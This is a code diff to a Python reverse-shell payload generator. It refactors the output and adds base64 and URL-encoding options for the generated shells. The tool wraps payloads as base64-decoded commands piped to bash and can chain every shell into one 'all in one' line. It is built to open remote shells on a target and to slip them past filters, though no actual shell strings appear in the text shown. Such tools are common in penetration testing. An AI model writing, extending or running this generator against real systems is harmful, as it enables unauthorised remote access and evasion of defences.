@@ -3,6 +3,18 @@ import sys
 import os
 import argparse
 import base64
+import urllib.parse
+
+def print_title(text: str):
+    print(f'\n\033[92;1m {text}\033[0m')
+
+def print_payload(text: str):
+    print(f' \033[32m{text}\033[0m')
+
+def print_all(rev_shells: list):
+    for name, shell in rev_shells:
+        print_title(name)
+        print_payload(shell)
 
 # Read the default_shells.txt to load in all available shells.
 def read_file(filename=None):
@@ -21,6 +33,7 @@ def parse_arguments():
     parser.add_argument("-P", "--port", help="Port of the server", required=True)
     parser.add_argument("-A", "--all", help="Use this argument to generate a full one liner to try all the reverse shell possible.", action="store_true")
     parser.add_argument("-B", "--base64", help="Encode all the reverse shells in base64 and build a one liner to execute the decoded string", action="store_true")
+    parser.add_argument("-U", "--urlencode", help="Encode all the revere shell in urlencode (if base64 is pecified, encodes them after it)", action="store_true")
 
     return parser.parse_args()
 
@@ -35,6 +48,23 @@ def generate(HOST="127.0.0.1", PORT=4444):
             result.append((payload_name, ready_payload))
     return result
 
+# Return base64 encoded shells
+def base64encoder(reverse_shells):
+    result = []
+    for name, shell in reverse_shells:
+        encoded_payload = base64.b64encode(shell.encode('utf-8')).decode('utf-8')
+        shell = f"echo {encoded_payload} | base64 -d | bash"
+        result.append((name, shell))
+    return result
+
+# Return url encoded shells
+def urlencoder(reverse_shells):
+    result = []
+    for name, shell in reverse_shells:
+        encoded_payload = urllib.parse.quote(shell)
+        result.append((name, encoded_payload))
+    return result
+
 # Run the script and output the available shells based on given arguments
 if __name__ == "__main__":
     args = parse_arguments()
@@ -42,22 +72,13 @@ if __name__ == "__main__":
     payloads = generate(HOST=args.host, PORT=args.port)
 
     if args.all:
-        code_payloads = []
-        for name, code in payloads:
-            code_payloads.append(code)
-        all_payloads = ");(".join(code_payloads)
-        all_payloads = "(" + all_payloads + ")"
-        print('\n\033[92;1m All in one\033[0m')
-        if args.base64:
-            b64_paylaods = base64.b64encode(all_payloads.encode('utf-8')).decode('utf-8')
-            print(f'\033[32mecho {b64_paylaods} | base64 -d | bash\033[0m')
-        else:
-            print(f'\033[32m{all_payloads}\033[0m')
-    else:
-        for name, code in payloads:
-            print(f'\n\033[92;1m {name}\033[0m')
-            if args.base64:
-                b64_paylaod = base64.b64encode(code.encode('utf-8')).decode('utf-8')
-                print(f'\033[32mecho {b64_paylaod} | base64 -d | bash\033[0m')
-            else:
-                print(f'\033[32m{code}\033[0m')
+        tmp_shells = []
+        for name, payload in payloads:
+            tmp_shells.append(payload)
+        payloads = [("All in one", "(" + ");(".join(tmp_shells) + ")")]
+    if args.base64:
+        payloads = base64encoder(payloads)
+    if args.urlencode:
+        payloads = urlencoder(payloads)
+    
+    print_all(payloads)
